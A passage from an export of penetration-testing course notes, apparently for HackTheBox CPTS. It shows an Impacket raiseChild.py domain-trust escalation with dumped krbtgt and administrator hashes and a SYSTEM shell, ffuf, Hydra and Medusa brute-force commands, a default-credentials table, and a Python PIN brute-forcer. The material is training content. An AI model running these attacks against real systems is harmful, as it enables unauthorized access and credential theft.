commands\nMicrosoft Windows [Version 10.0.17763.107]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32> whoami\nnt authority\\system\n\nC:\\Windows\\system32> hostname\nACADEMY-EA-DC01\n```\n\nImpacket also has the tool [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py), which will automate escalating from child to parent domain. We need to specify the target domain controller and credentials for an administrative user in the child domain; the script will do the rest. If we walk through the output, we see that it starts by listing out the child and parent domain's fully qualified domain names (FQDN). It then:\n\n- Obtains the SID for the Enterprise Admins group of the parent domain\n- Retrieves the hash for the KRBTGT account in the child domain\n- Creates a Golden Ticket\n- Logs into the parent domain\n- Retrieves credentials for the Administrator account in the parent domain\n\nFinally, if the `target-exec` switch is specified, it authenticates to the parent domain's Domain Controller via Psexec.\n\n#### Performing the Attack with raiseChild.py\n\nAttacking Domain Trusts - Child -> Parent Trusts - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm\n\nImpacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation\n\nPassword:\n[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL\n[*] Forest FQDN is: INLANEFREIGHT.LOCAL\n[*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL\n[*] INLANEFREIGHT.LOCAL Enterprise Admin SID is: S-1-5-21-3842939050-3880317879-2865463114-519\n[*] Getting credentials for LOGISTICS.INLANEFREIGHT.LOCAL\nLOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::\nLOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8\n[*] Getting credentials for INLANEFREIGHT.LOCAL\nINLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::\nINLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d\n[*] Target User account name is administrator\nINLANEFREIGHT.LOCAL/administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::\nINLANEFREIGHT.LOCAL/administrator:aes256-cts-hmac-sha1-96s:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6\n[*] Opening PSEXEC shell at ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\n[*] Requesting shares on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....\n[*] Found writable share ADMIN$\n[*] Uploading file BnEGssCE.exe\n[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....\n[*] Creating service UVNb on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....\n[*] Starting service UVNb.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.17763.107]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32>whoami\nnt authority\\system\n\nC:\\Windows\\system32>exit\n[*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0\n[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....\n[*] Stopping service UVNb.....\n[*] Removing service UVNb.....\n[*] Removing file BnEGssCE.exe.....\n```\n\nThe script lists out the workflow and process in a comment as follows:\n\nCode: python\n\n```python\n#   The workflow is as follows:\n#       Input:\n#           1) child-domain Admin credentials (password, hashes or aesKey) in the form of 'domain/username[:password]'\n#              The domain specified MUST be the domain FQDN.\n#           2) Optionally a pathname to save the generated golden ticket (-w switch)\n#           3) Optionally a target-user RID to get credentials (-targetRID switch)\n#              Administrator by default.\n#           4) Optionally a target to PSEXEC with the target-user privileges to (-target-exec switch).\n#              Enterprise Admin by default.\n#\n#       Process:\n#           1) Find out where the child domain controller is located and get its info (via [MS-NRPC])\n#           2) Find out what the forest FQDN is (via [MS-NRPC])\n#           3) Get the forest's Enterprise Admin SID (via [MS-LSAT])\n#           4) Get the child domain's krbtgt credentials (via [MS-DRSR])\n#           5) Create a Golden Ticket specifying SID from 3) inside the KERB_VALIDATION_INFO's ExtraSids array\n#              and setting expiration 10 years from now\n#           6) Use the generated ticket to log into the forest and get the target user info (krbtgt/admin by default)\n#           7) If file was specified, save the golden ticket in ccache format\n#           8) If target was specified, a PSEXEC shell is launched\n#\n#       Output:\n#           1) Target user credentials (Forest's krbtgt/admin credentials by default)\n#           2) A golden ticket saved in ccache for future fun and profit\n#           3) PSExec Shell with the target-user privileges (Enterprise Admin privileges by default) at target-exec\n#              parameter.\n```\n\nThough tools such as `raiseChild.py` can be handy and save us time, it is essential to understand the process and be able to perform the more manual version by gathering all of the required data points. In this case, if the tool fails, we are more likely to understand why and be able to troubleshoot what is missing, which we would not be able to if blindly running this tool. In a client production environment, we should **`always`** be careful when running any sort of \"autopwn\" script like this, and always remain cautious and construct commands manually when possible. Other tools exist which can take in data from a tool such as BloodHound, identify attack paths, and perform an \"autopwn\" function that can attempt to perform each action in an attack chain to elevate us to Domain Admin (such as a long ACL attack path). I would recommend avoiding tools such as these and work with tools that you understand fully, and will also give you the greatest degree of control throughout the process.\n\n`We don't want to tell the client that something broke because we used an \"autopwn\" script!`\n\n---\n\n## More Fun\n\nIn the next section, we will briefly discuss some techniques that can be used for cross-forest trust abuse when we find ourselves in an environment with a bidirectional forest trust (meaning we can authenticate into another forest). We will not cover all possible cross-forest trust attacks, as those will be covered in great detail in later modules.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/13-Using Web Proxies/01-Cheet Sheet Web Proxies",
    "path": "02_CPTS/13-Using Web Proxies/01-Cheet Sheet Web Proxies.md",
    "title": "01 Cheet Sheet Web Proxies",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Burp Shortcuts |Shortcut|Description| |---|---| |[CTRL+R]|Send to repeater| |[CTRL+SHIFT+R]|Go to repeater| |[CTRL+I]|Send to intruder| |[CTRL+SHIFT+I]|Go to intruder| |[CTRL+U]|URL encode| |[CTRL+SHI...",
    "category": "02_CPTS",
    "content": "# Burp Shortcuts\n\n|**Shortcut**|**Description**|\n|---|---|\n|[`CTRL+R`]|Send to repeater|\n|[`CTRL+SHIFT+R`]|Go to repeater|\n|[`CTRL+I`]|Send to intruder|\n|[`CTRL+SHIFT+I`]|Go to intruder|\n|[`CTRL+U`]|URL encode|\n|[`CTRL+SHIFT+U`]|URL decode|\n\n# ZAP Shortcuts\n\n|**Shortcut**|**Description**|\n|---|---|\n|[`CTRL+B`]|Toggle intercept on/off|\n|[`CTRL+R`]|Go to replacer|\n|[`CTRL+E`]|Go to encode/decode/hash|\n\n# Firefox Shortcuts\n\n|**Shortcut**|**Description**|\n|---|---|\n|[`CTRL+SHIFT+R`]|Force Refresh Page|\n![BurpSuite Extension](../../static/img/Pasted%20image%2020250901061123.png)",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/14-Attacking Web Application With FFuf/01- Cheet Sheet FFUF",
    "path": "02_CPTS/14-Attacking Web Application With FFuf/01- Cheet Sheet FFUF.md",
    "title": "01  Cheet Sheet FFUF",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Ffuf | Command                                                                                                                                                     | Description          | | ----------...",
    "category": "02_CPTS",
    "content": "\n# Ffuf\n\n| **Command**                                                                                                                                                     | **Description**          |\n| --------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------ |\n| `ffuf -h`                                                                                                                                                       | ffuf help                |\n| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ`                                                                                                       | Directory Fuzzing        |\n| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ`                                                                                                  | Extension Fuzzing        |\n| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php`                                                                                              | Page Fuzzing             |\n| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v`                                                              | Recursive Fuzzing        |\n| `ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/`                                                                                                      | Sub-domain Fuzzing       |\n| `ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx`                                                                     | VHost Fuzzing            |\n| `ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx`                                                                   | Parameter Fuzzing - GET  |\n| `ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx` | Parameter Fuzzing - POST |\n| `ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`       | Value Fuzzing            |\n\n# Wordlists\n\n| **Command**                                                              | **Description**         |\n| ------------------------------------------------------------------------ | ----------------------- |\n| `/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt` | Directory/Page Wordlist |\n| `/usr/share/seclists/Discovery/Web-Content/web-extensions.txt`           | Extensions Wordlist     |\n| `/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`      | Domain Wordlist         |\n| `/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt`     | Parameters Wordlist     |\n\n# Misc\n\n| **Command**                                                                                                                   | **Description**          |\n| ----------------------------------------------------------------------------------------------------------------------------- | ------------------------ |\n| `sudo sh -c 'echo \"SERVER_IP academy.htb\" >> /etc/hosts'`                                                                     | Add DNS entry            |\n| `for i in $(seq 1 1000); do echo $i >> ids.txt; done`                                                                         | Create Sequence Wordlist |\n| `curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'` | curl w/ POST             |\n",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/15-login Bruteforce/01-Cheat Sheet Login Brute Forcing",
    "path": "02_CPTS/15-login Bruteforce/01-Cheat Sheet Login Brute Forcing.md",
    "title": "01 Cheat Sheet Login Brute Forcing",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Login Brute Forcing Cheat Sheet --- What is Brute Forcing? A trial-and-error method used to crack passwords, login credentials, or encryption keys by systematically trying every possible combination o...",
    "category": "02_CPTS",
    "content": "# Login Brute Forcing Cheat Sheet\n\n---\n\n## What is Brute Forcing?\n\nA trial-and-error method used to crack passwords, login credentials, or encryption keys by systematically trying every possible combination of characters.\n\n### Factors Influencing Brute Force Attacks\n\n- Complexity of the password or key\n- Computational power available to the attacker\n- Security measures in place\n\n### How Brute Forcing Works\n\n1. Start: The attacker initiates the brute force process.\n2. Generate Possible Combination: The software generates a potential password or key combination.\n3. Apply Combination: The generated combination is attempted against the target system.\n4. Check if Successful: The system evaluates the attempted combination.\n5. Access Granted (if successful): The attacker gains unauthorized access.\n6. End (if unsuccessful): The process repeats until the correct combination is found or the attacker gives up.\n\n### Types of Brute Forcing\n\n|Attack Type|Description|Best Used When|\n|---|---|---|\n|Simple Brute Force|Tries every possible character combination in a set (e.g., lowercase, uppercase, numbers, symbols).|When there is no prior information about the password.|\n|Dictionary Attack|Uses a pre-compiled list of common passwords.|When the password is likely weak or follows common patterns.|\n|Hybrid Attack|Combines brute force and dictionary attacks, adding numbers or symbols to dictionary words.|When the target uses slightly modified versions of common passwords.|\n|Credential Stuffing|Uses leaked credentials from other breaches to access different services where users may have reused passwords.|When you have a set of leaked credentials, and the target may reuse passwords.|\n|Password Spraying|Attempts common passwords across many accounts to avoid detection.|When account lockout policies are in place.|\n|Rainbow Table Attack|Uses precomputed tables of password hashes to reverse them into plaintext passwords.|When a large number of password hashes need cracking, and storage for tables is available.|\n|Reverse Brute Force|Targets a known password against multiple usernames.|When there’s a suspicion of password reuse across multiple accounts.|\n|Distributed Brute Force|Distributes brute force attempts across multiple machines to speed up the process.|When the password is highly complex, and a single machine isn't powerful enough.|\n\n## Default Credentials\n\n- Default Usernames: Pre-set usernames that are widely known\n- Default Passwords: Pre-set, easily guessable passwords that come with devices and software\n\n|Device|Username|Password|\n|---|---|---|\n|Linksys Router|admin|admin|\n|Netgear Router|admin|password|\n|TP-Link Router|admin|admin|\n|Cisco Router|cisco|cisco|\n|Ubiquiti UniFi AP|ubnt|ubnt|\n\n## Brute-Forcing Tools\n\n### Hydra\n\n- Fast network login cracker\n- Supports numerous protocols\n- Uses parallel connections for speed\n- Flexible and adaptable\n- Relatively easy to use\n\nCode: bash\n\n```bash\nhydra [-l LOGIN|-L FILE] [-p PASS|-P FILE] [-C FILE] -m MODULE [service://server[:PORT][/OPT]]\n```\n\n|Hydra Service|Service/Protocol|Description|Example Command|\n|---|---|---|---|\n|ftp|File Transfer Protocol (FTP)|Used to brute-force login credentials for FTP services, commonly used to transfer files over a network.|`hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100`|\n|ssh|Secure Shell (SSH)|Targets SSH services to brute-force credentials, commonly used for secure remote login to systems.|`hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100`|\n|http-get/post|HTTP Web Services|Used to brute-force login credentials for HTTP web login forms using either GET or POST requests.|`hydra -l admin -P /path/to/password_list.txt 127.0.0.1 http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=incorrect\"`|\n\n### Medusa\n\n- Fast, massively parallel, modular login brute-forcer\n- Supports a wide array of services\n\nCode: bash\n\n```bash\nmedusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]\n```\n\n|Medusa Module|Service/Protocol|Description|Example Command|\n|---|---|---|---|\n|ssh|Secure Shell (SSH)|Brute force SSH login for the `admin` user.|`medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh`|\n|ftp|File Transfer Protocol (FTP)|Brute force FTP with multiple usernames and passwords using 5 parallel threads.|`medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp -t 5`|\n|rdp|Remote Desktop Protocol (RDP)|Brute force RDP login.|`medusa -h 192.168.1.100 -u admin -P passwords.txt -M rdp`|\n|http-get|HTTP Web Services|Brute force HTTP Basic Authentication.|`medusa -h www.example.com -U users.txt -P passwords.txt -M http -m GET`|\n|ssh|Secure Shell (SSH)|Stop after the first valid SSH login is found.|`medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -f`|\n\n### Custom Wordlists\n\nUsername Anarchy generates potential usernames based on a target's name.\n\n|Command|Description|\n|---|---|\n|`username-anarchy Jane Smith`|Generate possible usernames for \"Jane Smith\"|\n|`username-anarchy -i names.txt`|Use a file (`names.txt`) with names for input. Can handle space, CSV, or TAB delimited names.|\n|`username-anarchy -a --country us`|Automatically generate usernames using common names from the US dataset.|\n|`username-anarchy -l`|List available username format plugins.|\n|`username-anarchy -f format1,format2`|Use specific format plugins for username generation (comma-separated).|\n|`username-anarchy -@ example.com`|Append `@example.com` as a suffix to each username.|\n|`username-anarchy --case-insensitive`|Generate usernames in case-insensitive (lowercase) format.|\n\nCUPP (Common User Passwords Profiler) creates personalized password wordlists based on gathered intelligence.\n\n|Command|Description|\n|---|---|\n|`cupp -i`|Generate wordlist based on personal information (interactive mode).|\n|`cupp -w profiles.txt`|Generate a wordlist from a predefined profile file.|\n|`cupp -l`|Download popular password lists like `rockyou.txt`.|\n\n### Password Policy Filtering\n\nPassword policies often dictate specific requirements for password strength, such as minimum length, inclusion of certain character types, or exclusion of common patterns. `grep` combined with regular expressions can be a powerful tool for filtering wordlists to identify passwords that adhere to a given policy. Below is a table summarizing common password policy requirements and the corresponding `grep` regex patterns to apply:\n\n|Policy Requirement|Grep Regex Pattern|Explanation|\n|---|---|---|\n|Minimum Length (e.g., 8 characters)|`grep -E '^.{8,}$' wordlist.txt`|`^` matches the start of the line, `.` matches any character, `{8,}` matches 8 or more occurrences, `$` matches the end of the line.|\n|At Least One Uppercase Letter|`grep -E '[A-Z]' wordlist.txt`|`[A-Z]` matches any uppercase letter.|\n|At Least One Lowercase Letter|`grep -E '[a-z]' wordlist.txt`|`[a-z]` matches any lowercase letter.|\n|At Least One Digit|`grep -E '[0-9]' wordlist.txt`|`[0-9]` matches any digit.|\n|At Least One Special Character|`grep -E '[!@#$%^&*()_+-=[]{};':\"\\,.<>/?]' wordlist.txt`|`[!@#$%^&*()_+-=[]{};':\"\\,.<>/?]` matches any special character (symbol).|\n|No Consecutive Repeated Characters|`grep -E '(.)\\1' wordlist.txt`|`(.)` captures any character, `\\1` matches the previously captured character. This pattern will match any line with consecutive repeated characters. Use `grep -v` to invert the match.|\n|Exclude Common Patterns (e.g., \"password\")|`grep -v -i 'password' wordlist.txt`|`-v` inverts the match, `-i` makes the search case-insensitive. This pattern will exclude any line containing \"password\" (or \"Password\", \"PASSWORD\", etc.).|\n|Exclude Dictionary Words|`grep -v -f dictionary.txt wordlist.txt`|`-f` reads patterns from a file. `dictionary.txt` should contain a list of common dictionary words, one per line.|\n|Combination of Requirements|`grep -E '^.{8,}$' wordlist.txt \\| grep -E '[A-Z]'`|This command filters a wordlist to meet multiple password policy requirements. It first ensures that each word has a minimum length of 8 characters (`grep -E '^.{8,}$'`), and then it pipes the result into a second `grep` command to match only words that contain at least one uppercase letter (`grep -E '[A-Z]'`). This approach ensures the filtered passwords meet both the length and uppercase letter criteria.|",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/15-login Bruteforce/03-Password Security Fundamentals",
    "path": "02_CPTS/15-login Bruteforce/03-Password Security Fundamentals.md",
    "title": "03 Password Security Fundamentals",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "The effectiveness of brute-force attacks hinges on the strength of the passwords it targets. Understanding the fundamentals of password security is crucial for appreciating the importance of robust pa...",
    "category": "02_CPTS",
    "content": "The effectiveness of brute-force attacks hinges on the strength of the passwords it targets. Understanding the fundamentals of password security is crucial for appreciating the importance of robust password practices and the challenges posed by brute-force attacks.\n\n## The Importance of Strong Passwords\n\nPasswords are the first line of defense in protecting sensitive information and systems. A strong password is a formidable barrier, making it significantly harder for attackers to gain unauthorized access through brute forcing or other techniques. The longer and more complex a password is, the more combinations an attacker has to try, exponentially increasing the time and resources required for a successful attack.\n\n## The Anatomy of a Strong Password\n\nThe `National Institute of Standards and Technology` (`NIST`) provides guidelines for creating strong passwords. These guidelines emphasize the following characteristics:\n\n- `Length`: The longer the password, the better. Aim for a minimum of 12 characters, but longer is always preferable. The reasoning is simple: each additional character in a password dramatically increases the number of possible combinations. For instance, a 6-character password using only lowercase letters has 26^6 (approximately 300 million) possible combinations. In contrast, an 8-character password has 26^8 (approximately 200 billion) combinations. This exponential increase in possibilities makes longer passwords significantly more resistant to brute-force attacks.\n    \n- `Complexity`: While traditional advice emphasized using a mix of uppercase and lowercase letters, numbers, and symbols to create complex passwords, recent NIST guidelines have shifted focus towards password length and the use of passphrases. However, complexity remains an important consideration, especially in the context of brute force attacks. Including different character types expands the pool of potential characters for each position in the password. For example, a password using only lowercase letters has 26 possibilities per character, while a password using both uppercase and lowercase letters has 52 possibilities per character. This increased complexity can make it more challenging for attackers to predict or guess passwords. Despite the shift in emphasis, understanding the role of complexity can still be valuable in creating robust passwords.\n    \n- `Uniqueness`: Don't reuse passwords across different accounts. Each account should have its own unique and strong password. If one account is compromised, all other accounts using the same password are also at risk. By using unique passwords for each account, you compartmentalize the potential damage of a breach.\n    \n- `Randomness`: Avoid using dictionary words, personal information, or common phrases. The more random the password, the harder it is to crack. Attackers often use wordlists containing common passwords and personal information to speed up their brute-force attempts. Creating a random password minimizes the chances of being included in such wordlists.\n    \n\n## Common Password Weaknesses\n\nDespite the importance of strong passwords, many users still rely on weak and easily guessable passwords. Common weaknesses include:\n\n- `Short Passwords`: Passwords with fewer than eight characters are particularly vulnerable to brute-force attacks, as the number of possible combinations is relatively small.\n- `Common Words and Phrases`: Using dictionary words, names, or common phrases as passwords makes them susceptible to dictionary attacks, where attackers try a pre-defined list of common passwords.\n- `Personal Information`: Incorporating personal information like birthdates, pet names, or addresses into passwords makes them easier to guess, especially if this information is publicly available on social media or other online platforms.\n- `Reusing Passwords`: Using the same password across multiple accounts is risky. If one account is compromised, all other accounts using the same password are also at risk.\n- `Predictable Patterns`: Using patterns like \"qwerty\" or \"123456\" or simple substitutions like \"p@ssw0rd\" makes passwords easy to guess, as these patterns are well-known to attackers.\n\n## Password Policies\n\nOrganizations often implement password policies to enforce the use of strong passwords. These policies typically include requirements for:\n\n- `Minimum Length`: The minimum number of characters a password must have.\n- `Complexity`: The types of characters that must be included in a password (e.g., uppercase, lowercase, numbers, symbols).\n- `Password Expiration`: The frequency with which passwords must be changed.\n- `Password History`: The number of previous passwords that cannot be reused.\n\nWhile password policies can help improve password security, they can also lead to user frustration and the adoption of poor password practices, such as writing passwords down or using slight variations of the same password. When designing password policies, it's important to balance security and usability.\n\n## The Perils of Default Credentials\n\nOne critical aspect of password security often overlooked is the danger posed by `default passwords`. These pre-set passwords come with various devices, software, or online services. They are often simple and easily guessable, making them a prime target for attackers.\n\nDefault passwords significantly increase the success rate of brute-force attacks. Attackers can leverage lists of common default passwords, dramatically reducing the search space and accelerating the cracking process. In some cases, attackers may not even need to perform a brute-force attack; they can try a few common default passwords and gain access with minimal effort.\n\nThe prevalence of default passwords makes them a low-hanging fruit for attackers. They provide an easy entry point into systems and networks, potentially leading to data breaches, unauthorized access, and other malicious activities.\n\n| Device/Manufacturer  | Default Username | Default Password | Device Type                  |\n| -------------------- | ---------------- | ---------------- | ---------------------------- |\n| Linksys Router       | admin            | admin            | Wireless Router              |\n| D-Link Router        | admin            | admin            | Wireless Router              |\n| Netgear Router       | admin            | password         | Wireless Router              |\n| TP-Link Router       | admin            | admin            | Wireless Router              |\n| Cisco Router         | cisco            | cisco            | Network Router               |\n| Asus Router          | admin            | admin            | Wireless Router              |\n| Belkin Router        | admin            | password         | Wireless Router              |\n| Zyxel Router         | admin            | 1234             | Wireless Router              |\n| Samsung SmartCam     | admin            | 4321             | IP Camera                    |\n| Hikvision DVR        | admin            | 12345            | Digital Video Recorder (DVR) |\n| Axis IP Camera       | root             | pass             | IP Camera                    |\n| Ubiquiti UniFi AP    | ubnt             | ubnt             | Wireless Access Point        |\n| Canon Printer        | admin            | admin            | Network Printer              |\n| Honeywell Thermostat | admin            | 1234             | Smart Thermostat             |\n| Panasonic DVR        | admin            | 12345            | Digital Video Recorder (DVR) |\n\nThese are just a few examples of well-known default passwords. Attackers often compile extensive lists of such passwords and use them in automated attacks.\n\nAlongside default passwords, default usernames are another major security concern. Manufacturers often ship devices with pre-set usernames, such as `admin`, `root`, or `user`. You might have noticed in the table above how many use common usernames. These usernames are widely known and often published in documentation or readily available online. SecLists maintains a list of common usernames at [top-usernames-shortlist.txt](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt)\n\nDefault usernames are a significant vulnerability because they give attackers a predictable starting point. In many brute-force attacks, knowing the username is half the battle. With the username already established, the attacker only needs to crack the password, and if the device still uses a default password, the attack can be completed with minimal effort.\n\nEven when default passwords are changed, retaining the default username still leaves systems vulnerable to attacks. It drastically narrows the attack surface, as the hacker can skip the process of guessing usernames and focus solely on the password.\n\n### Brute-forcing and Password Security\n\nIn a brute-force scenario, the strength of the target passwords becomes the attacker's primary obstacle. A weak password is akin to a flimsy lock on a door – easily picked open with minimal effort. Conversely, a strong password acts as a fortified vault, demanding significantly more time and resources to breach.\n\nFor a pentester, this translates to a deeper understanding of the target's security posture:\n\n- `Evaluating System Vulnerability:` Password policies, or their absence, and the likelihood of users employing weak passwords directly inform the potential success of a brute-force attack.\n- `Strategic Tool Selection:` The complexity of the passwords dictates the tools and methodologies a pentester will deploy. A simple dictionary attack might suffice for weak passwords, while a more sophisticated, hybrid approach may be required to crack stronger ones.\n- `Resource Allocation:` The estimated time and computational power needed for a brute-force attack is intrinsically linked to the complexity of the passwords. This knowledge is essential for effective planning and resource management.\n- `Exploiting Weak Points:` Default passwords are often a system's Achilles' heel. A pentester's ability to identify and leverage these easily guessable credentials can provide a swift entry point into the target network.\n\nIn essence, a deep understanding of password security is a roadmap for a pentester navigating the complexities of a brute-force attack. It unveils potential weak points, informs strategic choices, and predicts the effort required for a successful breach. This knowledge, however, is a double-edged sword. It also underscores the critical importance of robust password practices for any organization seeking to defend against such attacks, highlighting each user's pivotal role in safeguarding sensitive information.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/15-login Bruteforce/04-Brute Force Attacks",
    "path": "02_CPTS/15-login Bruteforce/04-Brute Force Attacks.md",
    "title": "04 Brute Force Attacks",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "To truly grasp the challenge of brute forcing, it's essential to understand the underlying mathematics. The following formula determines the total number of possible combinations for a password: Code:...",
    "category": "02_CPTS",
    "content": "\n\nTo truly grasp the challenge of brute forcing, it's essential to understand the underlying mathematics. The following formula determines the total number of possible combinations for a password:\n\nCode: mathml\n\n```mathml\nPossible Combinations = Character Set Size^Password Length\n```\n\nFor example, a 6-character password using only lowercase letters (character set size of 26) has 26^6 (approximately 300 million) possible combinations. In contrast, an 8-character password with the same character set has 26^8 (approximately 200 billion) combinations. Adding uppercase letters, numbers, and symbols to the character set further expands the search space exponentially.\n\nThis exponential growth in the number of combinations highlights the importance of password length and complexity. Even a small increase in length or the inclusion of additional character types can dramatically increase the time and resources required for a successful brute-force attack.\n\nLet's consider a few scenarios to illustrate the impact of password length and character set on the search space:\n\n||Password Length|Character Set|Possible Combinations|\n|---|---|---|---|\n|`Short and Simple`|6|Lowercase letters (a-z)|26^6 = 308,915,776|\n|`Longer but Still Simple`|8|Lowercase letters (a-z)|26^8 = 208,827,064,576|\n|`Adding Complexity`|8|Lowercase and uppercase letters (a-z, A-Z)|52^8 = 53,459,728,531,456|\n|`Maximum Complexity`|12|Lowercase and uppercase letters, numbers, and symbols|94^12 = 475,920,493,781,698,549,504|\n\nAs you can see, even a slight increase in password length or the inclusion of additional character types dramatically expands the search space. This significantly increases the number of possible combinations that an attacker must try, making brute-forcing increasingly challenging and time-consuming. However, the time it takes to crack a password isn't just dependent on the size of the search space—it also hinges on the attacker's available computational power.\n\nThe more powerful the attacker's hardware (e.g., the number of GPUs, CPUs, or cloud-based computing resources they can utilize), the more password guesses they can make per second. While a complex password can take years to brute-force with a single machine, a sophisticated attacker using a distributed network of high-performance computing resources could reduce that time drastically.\n\n![Bar chart comparing password cracking times for basic and super computers across different password complexities.](https://academy.hackthebox.com/storage/modules/57/powern.png)\n\nThe above chart illustrates an exponential relationship between password complexity and cracking time. As the password length increases and the character set expands, the total number of possible combinations grows exponentially. This significantly increases the time required to crack the password, even with powerful computing resources.\n\nComparing the basic computer and the supercomputer:\n\n- Basic Computer (1 million passwords/second): Adequate for cracking simple passwords quickly but becomes impractically slow for complex passwords. For instance, cracking an 8-character password using letters and digits would take approximately 6.92 years.\n- Supercomputer (1 trillion passwords/second): Drastically reduces cracking times for simpler passwords. However, even with this immense power, cracking highly complex passwords can take an impractical amount of time. For example, a 12-character password with all ASCII characters would still take about 15000 years to crack.\n\n## Cracking the PIN\n\n**To follow along, start the target system via the question section at the bottom of the page.**\n\nThe instance application generates a random 4-digit PIN and exposes an endpoint (`/pin`) that accepts a PIN as a query parameter. If the provided PIN matches the generated one, the application responds with a success message and a flag. Otherwise, it returns an error message.\n\nWe will use this simple demonstration Python script to brute-force the `/pin` endpoint on the API. Copy and paste this Python script below as `pin-solver.py` onto your machine. You only need to modify the IP and port variables to match your target system information.\n\nCode: python\n\n```python\nimport requests\n\nip = \"127.0.0.1\"  # Change this to your instance IP address\nport = 1234       # Change this to your instance port number\n\n# Try every possible 4-digit PIN (from 0000 to 9999)\nfor pin in range(10000):\n    formatted_pin = f\"{pin:04d}\"  # Convert the number to a 4-digit string (e.g., 7 becomes \"0007\")\n    print(f\"Attempted PIN: {formatted_pin}\")\n\n    # Send the request to the server\n    response = requests.get(f\"http://{ip}:{port}/pin?pin={formatted_pin}\")\n\n    # Check if the server responds with success and the flag is found\n    if response.ok and 'flag' in response.json():  # .ok means status code is 200 (success)\n        print(f\"Correct PIN found: {formatted_pin}\")\n        print(f\"Flag: {response.json()['flag']}\")\n        break\n```\n\nThe Python script systematically iterates all possible 4-digit PINs (0000 to 9999) and sends GET requests to the Flask endpoint with each PIN. It checks the response status code and content to identify the correct PIN and capture the associated flag.\n\nBrute Force Attacks\n\n```shell-session\ndrxh3kr@htb[/htb]$ python pin-solver.py\n\n...\nAttempted PIN: 4039\nAttempted PIN: 4040\nAttempted PIN: 4041\nAttempted PIN: 4042\nAttempted PIN: 4043\nAttempted PIN: 4044\nAttempted PIN: 4045\nAttempted PIN: 4046\nAttempted PIN: 4047\nAttempted PIN: 4048\nAttempted PIN: 4049\nAttempted PIN: 4050\nAttempted PIN: 4051\nAttempted PIN: 4052\nCorrect PIN found: 4053\nFlag: HTB{...}\n```\n\nThe script's output will show the progression of the brute-force attack, displaying each attempted PIN and its corresponding result. The final output will reveal the correct PIN and the captured flag, demonstrating the successful completion of the brute-force attack.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/15-login Bruteforce/05-Dictionary Attacks",
    "path": "02_CPTS/15-login Bruteforce/05-Dictionary Attacks.md",
    "title": "05 Dictionary Attacks",
    "tags": [],
    "date": "2025-09-17",
